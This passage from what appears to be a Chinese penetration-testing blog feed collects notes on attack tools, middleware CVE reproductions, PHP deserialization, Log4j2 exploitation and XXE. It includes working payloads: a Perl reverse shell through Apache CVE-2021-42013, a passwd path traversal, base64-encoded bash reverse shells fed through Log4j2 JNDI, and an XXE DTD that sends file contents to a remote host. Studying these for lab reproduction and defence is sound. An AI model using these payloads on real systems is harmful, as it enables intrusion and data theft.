href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li><li>Ladon：用于大型网络渗透的多线程插件化综合扫描工具 <a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></li></ul><h2 id="漏洞研究"><a href="#漏洞研究" class="headerlink" title="漏洞研究"></a><strong>漏洞研究</strong></h2><h3 id="漏洞综述"><a href="#漏洞综述" class="headerlink" title="漏洞综述"></a><strong>漏洞综述</strong></h3><ul><li>未授权访问漏洞总结：<a href="http://luckyzmj.cn/posts/15dff4d3.html#toc-heading-3">http://luckyzmj.cn/posts/15dff4d3.html#toc-heading-3</a></li></ul><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a><strong>漏洞挖掘</strong></h3><ul><li>Windows-Exploit-Suggester：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li><li>Linux_Exploit_Suggester：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></li></ul><h3 id="开源漏洞库"><a href="#开源漏洞库" class="headerlink" title="开源漏洞库"></a><strong>开源漏洞库</strong></h3><ul><li>Vulhub：<a href="https://vulhub.org/3">https://vulhub.org/3</a></li><li>PeiQi文库：<a href="http://wiki.peiqi.tech/">http://wiki.peiqi.tech/</a></li><li>PoCBox：<a href="https://github.com/0verSp4ce/PoCBox">https://github.com/0verSp4ce/PoCBox</a></li><li>Vulnerability：<a href="https://github.com/EdgeSecurityTeam/Vulnerability">https://github.com/EdgeSecurityTeam/Vulnerability</a></li><li>POChouse：<a href="https://github.com/DawnFlame/POChouse">https://github.com/DawnFlame/POChouse</a></li></ul><h3 id="POC-x2F-EXP"><a href="#POC-x2F-EXP" class="headerlink" title="POC/EXP"></a><strong>POC/EXP</strong></h3><ul><li>ysoserial：Java反序列化 <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li><li>Vulmap：漏洞扫描和验证工具 <a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></li><li>Some-PoC-oR-ExP：各种漏洞PoC、ExP的收集或编写 <a href="https://github.com/coffeehb/Some-PoC-oR-ExP">https://github.com/coffeehb/Some-PoC-oR-ExP</a></li><li>CMS-Hunter：CMS漏洞测试用例集合 <a href="https://github.com/SecWiki/CMS-Hunter">https://github.com/SecWiki/CMS-Hunter</a></li><li>Penetration_Testing_POC：<a href="https://github.com/Mr-xn/Penetration_Testing_POC">https://github.com/Mr-xn/Penetration_Testing_POC</a></li><li>永恒之蓝：<a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></li></ul><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h2><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a><strong>Bypass</strong></h3><ul><li>PHPFuck：<a href="https://github.com/splitline/PHPFuck">https://github.com/splitline/PHPFuck</a></li><li>JSFuck：<a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></li></ul><h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a><strong>Payloads</strong></h3><ul><li>PayloadsAllTheThings：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li><li>java.lang.Runtime.exec() Payload：java Payload在线生成 <a href="https://www.bugku.net/runtime-exec-payloads/">https://www.bugku.net/runtime-exec-payloads/</a></li><li>PHP Generic Gadget Chains：PHP反序列化Payload <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></li></ul><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a><strong>WebShell</strong></h3><ul><li><p>Webshell收集项目：<a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p></li><li><p>反弹shell命令速查：<a href="https://github.com/Threekiii/Awesome-Redteam">https://github.com/Threekiii/Awesome-Redteam</a></p></li><li><p>Behinder 冰蝎：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p></li><li><ul><li>Behinder3：kali + java 11.0.14 或 windows10 + java 1.8.0_91，注意，该环境下Behinder2无法正常运行</li><li>Behinder2：windows10 + java 1.8.0_91</li></ul></li><li><p>Godzilla 哥斯拉：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p></li></ul><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a><strong>内网穿透</strong></h3><ul><li>NPS：通过web端管理，无需配置文件 <a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></li><li>FRP：55k star项目 <a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></li><li>Neo-reGeorg：tunnel快速部署 <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></li><li>Proxifier：windows代理工具 <a href="https://www.proxifier.com/">https://www.proxifier.com/</a></li><li>Proxychains：kali代理工具 <a href="https://github.com/haad/proxychains">https://github.com/haad/proxychains</a></li></ul><h3 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a><strong>容器逃逸</strong></h3><ul><li>CDK：容器渗透 <a href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h3><ul><li>The art of command line：快速掌握命令行 <a href="https://github.com/jlevy/the-art-of-command-line">https://github.com/jlevy/the-art-of-command-line</a></li><li>Responder：实现获取NTLM Hash等功能 <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></li><li>Impacket：其中的psexec.py通过用户名和密码远程连接到目标服务器 <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li><li>PsTools：PsExec.exe功能同Impacket中的psexec.py <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</a></li></ul><h2 id="移动端安全"><a href="#移动端安全" class="headerlink" title="移动端安全"></a><strong>移动端安全</strong></h2><ul><li>CrackMinApp：反编译微信小程序 <a href="https://github.com/Cherrison/CrackMinApp">https://github.com/Cherrison/CrackMinApp</a></li><li>AppInfoScanner：移动端信息收集 <a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></li></ul><h2 id="安全厂商"><a href="#安全厂商" class="headerlink" title="安全厂商"></a><strong>安全厂商</strong></h2><ul><li>安全厂商及其官网链接：<a href="https://github.com/Threekiii/Awesome-Redteam">https://github.com/Threekiii/Awesome-Redteam</a></li></ul><h2 id="工具赋能"><a href="#工具赋能" class="headerlink" title="工具赋能"></a><strong>工具赋能</strong></h2><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h3><ul><li>Metasploit：<a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></li></ul><h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a><strong>Cobaltstrike</strong></h3><ul><li>Awesome CobaltStrike：CobaltStrike知识库 <a href="https://github.com/zer0yu/Awesome-CobaltStrike">https://github.com/zer0yu/Awesome-CobaltStrike</a></li><li>Erebus：后渗透测试插件 <a href="https://github.com/DeEpinGh0st/Erebus">https://github.com/DeEpinGh0st/Erebus</a></li><li>LSTAR：综合后渗透插件 <a href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></li><li>ElevateKit：提权插件 <a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></li></ul><h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a><strong>Burpsuite</strong></h3><ul><li>HaE：高亮标记与信息提取辅助型插件 <a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a></li><li>Log4j2Scan：Log4j主动扫描 <a href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a></li></ul><h3 id="Chrome-crx"><a href="#Chrome-crx" class="headerlink" title="Chrome crx"></a><strong>Chrome crx</strong></h3><ul><li>Proxy SwitchyOmega：快速切换代理 <a href="https://github.com/FelisCatus/SwitchyOmega">https://github.com/FelisCatus/SwitchyOmega</a></li><li>Wappalyzer：识别网站技术/框架/语言 <a href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a></li><li>EditThisCookie：修改Cookie <a href="https://www.editthiscookie.com/">https://www.editthiscookie.com/</a></li><li>FindSomething：在网页的源代码或js中寻找有用信息 <a href="https://github.com/ResidualLaugh/FindSomething">https://github.com/ResidualLaugh/FindSomething</a></li><li>Disable JavaScript：禁用JavaScript绕过弹窗 <a href="https://github.com/dpacassi/disable-javascript">https://github.com/dpacassi/disable-javascript</a></li><li>Hunter：查找网页暴露邮箱 <a href="https://hunter.io/chrome">https://hunter.io/chrome</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</title>
      <link href="/2022/04/16/zhong-jian-jian-an-quan-cve-fu-xian-iis-apache-tomcat-nginx/"/>
      <url>/2022/04/16/zhong-jian-jian-an-quan-cve-fu-xian-iis-apache-tomcat-nginx/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h3 id="中间件安全-amp-CVE复现-amp-IIS-amp-Apache-amp-Tomcat-amp-Nginx"><a href="#中间件安全-amp-CVE复现-amp-IIS-amp-Apache-amp-Tomcat-amp-Nginx" class="headerlink" title="中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx"></a>中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</h3><hr><p>中间件及框架列表：</p><pre><code>IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</code></pre><h4 id="一-中间件-IIS-短文件-amp-解析-amp-蓝屏等"><a href="#一-中间件-IIS-短文件-amp-解析-amp-蓝屏等" class="headerlink" title="一.中间件-IIS-短文件&amp;解析&amp;蓝屏等:"></a>一.中间件-IIS-短文件&amp;解析&amp;蓝屏等:</h4><p>1、短文件：信息收集</p><p>2、文件解析：还有点用</p><p>3、HTTP.SYS：蓝屏崩溃</p><p>4、CVE-2017-7269 条件过老</p><h4 id="二-中间件-Nginx-文件解析-amp-命令执行等"><a href="#二-中间件-Nginx-文件解析-amp-命令执行等" class="headerlink" title="二.中间件-Nginx-文件解析&amp;命令执行等:"></a>二.中间件-Nginx-文件解析&amp;命令执行等:</h4><p>1、后缀解析 文件名解析</p><p>配置不当：该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p><p>CVE-2013-4547：影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><p>2、cve_2021_23017 无EXP</p><p>3、cve_2017_7529 意义不大</p><h4 id="三-中间件-Apache-RCE-amp-目录遍历-amp-文件解析等"><a href="#三-中间件-Apache-RCE-amp-目录遍历-amp-文件解析等" class="headerlink" title="三.中间件-Apache-RCE&amp;目录遍历&amp;文件解析等:"></a>三.中间件-Apache-RCE&amp;目录遍历&amp;文件解析等:</h4><p>Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。</p><p>1.cve_2021_42013  RCE:</p><pre><code>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh echo;perl -e 'use Socket;$i="47.94.236.117";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre><p>2、cve_2021_41773 目录穿越</p><p>Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p><pre><code>Burp：/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd</code></pre><p>3、cve-2017-15715  文件解析</p><p>Apache HTTPD是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>4、cve_2017_9798 价值不高</p><p>5、cve_2018_11759 价值不高</p><p>6、cve_2021_37580 插件问题</p><h4 id="四-中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等"><a href="#四-中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等" class="headerlink" title="四.中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等:"></a>四.中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等:</h4><p>1、弱口令猜解</p><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p><p>生成马：xx.jsp 然后压缩成xx.zip 然后改后缀名为xx.war 进行上传</p><p>2、CVE-2017-12615 文件上传</p><p>当存在漏洞的Tomcat运行在Windows/Linux主机上， 且启用了HTTP PUT请求方法（ 例如， 将readonly初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</p><p>影响版本:Apache Tomcat 7.0.0 - 7.0.79</p><p>PUT /1.jsp/ HTTP/1.1</p><p>shell代码</p><p>3、cve_2020_1938 文件包含</p><p>Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p><p>漏洞影响的产品版本包括：</p><p>Tomcat 6.*</p><p>Tomcat 7.* &lt; 7.0.100</p><p>Tomcat 8.* &lt; 8.5.51</p><p>Tomcat 9.* &lt; 9.0.31</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><pre><code>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76 -p 63667 -f WEB-INF/web.xml</code></pre><p>4、cve_2020_11996 拒绝服务</p><p>危害过大，权限无关，意义不大</p><p>5、cve_2020_9484 反序列化</p><p>利用条件太苛刻，意义不大</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</title>
      <link href="/2022/04/13/php-fan-xu-lie-hua-pop-lian-gou-zao-mo-zhu-fang-fa-yuan-sheng-lei/"/>
      <url>/2022/04/13/php-fan-xu-lie-hua-pop-lian-gou-zao-mo-zhu-fang-fa-yuan-sheng-lei/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h3 id="PHP反序列化-amp-POP链构造-amp-魔术方法-amp-原生类"><a href="#PHP反序列化-amp-POP链构造-amp-魔术方法-amp-原生类" class="headerlink" title="PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类"></a>PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</h3><hr><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     //将一个对象转换成一个字符串</p><p>unserialize()   //将字符串还原成一个对象</p><h4 id="PHP反序列化漏洞："><a href="#PHP反序列化漏洞：" class="headerlink" title="PHP反序列化漏洞："></a>PHP反序列化漏洞：</h4><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h4 id="php中魔术方法："><a href="#php中魔术方法：" class="headerlink" title="php中魔术方法："></a>php中魔术方法：</h4><pre><code>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：__construct(): //构造函数，当对象new的时候会自动调用__destruct()：//析构函数当对象被销毁时会被自动调用__wakeup(): //unserialize()时会被自动调用__invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用__call(): //在对象上下文中调用不可访问的方法时触发__callStatci(): //在静态上下文中调用不可访问的方法时触发__get(): //用于从不可访问的属性读取数据__set(): //用于将数据写入不可访问的属性__isset(): //在不可访问的属性上调用isset()或empty()触发__unset(): //在不可访问的属性上使用unset()时触发__toString(): //把类当作字符串使用时触发__sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</code></pre><pre><code>O：4：”info“：2：{s：5：“namea”；i：1：“9”；}O：object 代表数组，i代表数组4：对象长度info：对象名称2：该对象中变量的个数s:变量数据类型，s代表string,i代表int4:变量名长度namea:变量名</code></pre><p>上述是反序列化出来的格式</p><h4 id="PHP原生类-获取-amp-利用-amp-配合其他："><a href="#PHP原生类-获取-amp-利用-amp-配合其他：" class="headerlink" title="PHP原生类-获取&amp;利用&amp;配合其他："></a>PHP原生类-获取&amp;利用&amp;配合其他：</h4><p>内置的一个组件</p><pre><code>参考：https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception</code></pre><p>生成序列化时记得开启SoapClient拓展：php.ini中启用php_soap.dll</p><p>脚本：</p><p>参考案例：<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p><pre><code>&lt;?php$classes = get_declared_classes();foreach ($classes as $class) {    $methods = get_class_methods($class);    foreach ($methods as $method) {        if (in_array($method, array(            '__destruct',            '__toString',            '__wakeup',            '__call',            '__callStatic',            '__get',            '__set',            '__isset',            '__unset',            '__invoke',            '__set_state'        ))) {            print $class . '::' . $method . "\n";        }    }} </code></pre><h3 id="PHP反序列化-amp-原生类-amp-漏洞绕过-amp-公私有属性"><a href="#PHP反序列化-amp-原生类-amp-漏洞绕过-amp-公私有属性" class="headerlink" title="PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性"></a>PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</h3><hr><h4 id="对象变量属性："><a href="#对象变量属性：" class="headerlink" title="对象变量属性："></a>对象变量属性：</h4><p>public(公共的):在本类内部、外部类、子类都可以访问</p><p>protect(受保护的):只有本类或子类或父类中可以访问</p><p>private(私人的):只有本类内部可以使用</p><p>序列化数据显示：</p><p>private属性序列化的时候格式是%00类名%00成员名</p><p>protect属性序列化的时候格式是%00*%00成员名</p><pre><code>&lt;?phpheader("Content-type: text/html; charset=utf-8");/*public private protected说明class test{​    public $name="xiaodi";​    private $age="29";​    protected $sex="man";}$a=new test();$a=serialize($a);print_r($a);*/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞复现</title>
      <link href="/2022/04/07/log4j2-lou-dong-fu-xian/"/>
      <url>/2022/04/07/log4j2-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h1 id="log4j2漏洞复现"><a href="#log4j2漏洞复现" class="headerlink" title="log4j2漏洞复现"></a>log4j2漏洞复现</h1><p> 最近的特大漏洞log4j2的出现，也是掀起了安全圈的一个风暴呀，自己也尝试着来复现一下吧，毕竟慢慢成长嘛。</p><p>漏洞描述Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞影响版本Apache Log4j 2.x &lt; 2.15.0-rc2</p><p>下面直接开始复现</p><p>现在虚拟机上面拉个Java环境，这样方便嘛</p><p>直接执行代码docker pull vulfocus/log4j2-rce-2021-12-09:latest</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203247.png"></p><p>然后docker images 观看是那个镜像文件，把它跑起来</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203257.png"></p><p>直接docker run -d -P vulfocus/log4j2-rce-2021-12-09  然后看这个跑起来的虚拟机的那个端口号映射到了本虚拟机的端口号docker ps</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203313.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203320.png"></p><p>然后就直接访问这个网页是否搭建成功 直接访问192.168.227.128：49153   192.168.227.128是我kali虚拟机的ip</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203336.png"></p><p>然后就要先检测这个网页是否纯在log4j2这个漏洞，直接上bp。这里要主要箭头的地方，直接构造的payload要使用自己ceye上的payload=${jndi:ldap://zzz.yqy3cn.ceye.io} 前面的二级域名随便写什么，不写也可以。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203344.png"></p><p>然后在ceye.io上出现了这个以后，就代表纯在这个log4j2漏洞。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203356.png"></p><p>现在就到了最刺激的一步了，直接来弹shell吧。。</p><p>首先我们要启动一个idap服务，那就去github（JNDI-Injection-Exploit）上面下载吧。下载完成后在本地执行命令</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ}|{base64,-d}|{bash,-i}”-A “xxxxx(执行这个命令的本机ip)”</p><p>当然我这里是在自己的服务器上执行的，都可以看感觉吧 哈哈哈</p><p>先把这个文件提到我的服务器上面去</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203404.png"></p><p>然后直接执行命令哇，但是这里要注意写进去的shell命令要编码喔，否则不行。</p><p>bash -i &gt;&amp; /dev/tcp/120.25.208.59/6363 0&gt;&amp;1 直接反弹到自己的服务区上面去。在<a href="https://www.jackson-t.ca/runtime-exec-payloads.html%E7%BC%96%E7%A0%81%E5%90%8E%E4%B8%BA">https://www.jackson-t.ca/runtime-exec-payloads.html编码后为</a></p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjUuMjA4LjU5LzYzNjMgMD4mMQ==}|{base64,-d}|{bash,-i}</p><p>然后在服务器上面执行那个命令</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203419.png"></p><p>然后将这个放到bp上面执行，在自己的服务起上面监听6363端口</p><p>payload=${jndi:ldap://baidu.ehlf5h.ceye.io}</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203427.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203434.png"></p><p>然后就直接拿到shell,完成复现。</p><p><img src="https://raw.githubusercontent.com/hostboyii/picbed/master/img20220405203441.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</title>
      <link href="/2022/04/05/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/"/>
      <url>/2022/04/05/xml-xxe-wu-hui-xian-dtd-shi-ti-wei-xie-yi-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h4 id="XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计"><a href="#XML-amp-XXE-amp-无回显-amp-DTD实体-amp-伪协议-amp-代码审计" class="headerlink" title="XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计"></a><strong>XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</strong></h4><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><p>客户端：xml发送数据</p><p>服务端：xml解析数据</p><p>利用xml写一个带有文件读取的代码尝试发送，类似文件读取功能实现</p><p>无回显：要利用带外测试（利用dnslog来做测试！） </p><p>实体引用：引用远程的evil2.dtd文件</p><h5 id="1-解决拦截防护绕过问题"><a href="#1-解决拦截防护绕过问题" class="headerlink" title="1.解决拦截防护绕过问题"></a>1.解决拦截防护绕过问题</h5><pre><code>&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd"&gt;​    %file;]&gt;&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</code></pre><p>evil2.dtd ：该文件读取d:e.txt的内容</p><pre><code>&lt;!ENTITY send SYSTEM "file:///d:/e.txt"&gt;##### 2.解决数据不回显的问题</code></pre><pre><code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM "file:///d:/e.txt"&gt;&lt;!ENTITY % remote SYSTEM "http://47.109.33.184/test.dtd"&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;</code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://47.109.33.184/get.php?file=%file;'&gt;"&gt;</code></pre><h5 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h5><p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p><p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p><p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p><p>更改请求数据格式：Content-Type</p><h5 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="XXE白盒发现："></a>XXE白盒发现：</h5><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p><h5 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h5><p>-方案1-禁用外部实体</p><p>PHP:</p><p>libxml_disable_entity_loader(true);</p><p>JAVA:</p><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p><p>Python：</p><p>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><p>-方案2-过滤用户提交的XML数据</p><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</title>
      <link href="/2022/03/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/"/>
      <url>/2022/03/14/ying-yong-xie-yi-rsync-ssh-rdp-ftp-lou-dong-pi-sao-kou-ling-cai-jie/</url>
      
